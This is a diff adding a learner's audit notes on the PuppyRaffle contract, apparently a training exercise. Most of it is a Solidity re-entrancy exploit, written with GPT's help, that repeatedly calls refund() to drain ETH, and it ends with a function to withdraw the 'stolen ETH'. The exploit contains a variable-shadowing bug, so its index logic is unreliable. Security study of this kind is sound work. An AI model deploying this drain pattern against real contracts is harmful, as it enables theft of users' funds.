@@ -1,0 +1,85 @@
+
+The Re-entrancy is the first bug, i attempted to test, after finding out that the function used to do the transfer uses up the gas i became more confident.
+
+I took help for syntax from Google [which showed up gemini], also GPT'd the syntax, BUT I FOUND THE BUG MYSELF, only help was in writting exploit.
+
+The exploit was failing due to a dumb mistake in creating an array of addresses. So i told GPT in writting the exploit, it used interface and all that.
+
+GPT itself was making a syntax error in creating the dynamic array.
+
+---
+
+The solution GPT gave me 
+
+// SPDX-License-Identifier: MIT
+// pragma solidity ^0.8.33; [fix the compiler version]
+
+interface IPuppyRaffle {
+    function enterRaffle(address[] memory newPlayers) external payable;
+    function refund(uint256 playerIndex) external;
+    function getActivePlayerIndex(address player) external view returns (uint256);
+}
+
+contract PuppyRaffleExploit {
+
+    IPuppyRaffle public target;
+    address public owner;
+    uint256 public index;
+    uint256 public attackCount;
+    uint256 public maxAttacks;
+
+    constructor(address _target) {
+        target = IPuppyRaffle(_target);
+        owner = msg.sender;
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Not owner");
+        _;
+    }
+
+    // Step 1: enter raffle
+    function enter() external payable onlyOwner {
+    // 1. Properly declare and initialize the memory array
+    address[] memory players = new address[](1); 
+    players[0] = address(this); 
+
+    // Enter the raffle
+    target.enterRaffle{value: msg.value}(players);
+
+    // 2. Declare the type for 'index' (assuming it's a uint256)
+    uint256 index = target.getActivePlayerIndex(address(this));
+}
+
+
+
+    // Step 2: start attack
+    function attack(uint256 _maxAttacks) external onlyOwner {
+        maxAttacks = _maxAttacks;
+        attackCount = 0;
+
+        target.refund(index);
+    }
+
+    // Reentrancy trigger
+    receive() external payable {
+        attackCount++;
+
+        if (attackCount < maxAttacks) {
+            target.refund(index);
+        }
+    }
+
+    // Withdraw stolen ETH
+    function withdraw() external onlyOwner {
+        payable(owner).transfer(address(this).balance);
+    }
+
+    function getBalance() external view returns (uint256) {
+        return address(this).balance;
+    }
+}
+
+---
+
+I think there might be preditability of winner, but i will have to write an exploit to prove it ofcourse... But I will look into finding some logic issues as well.
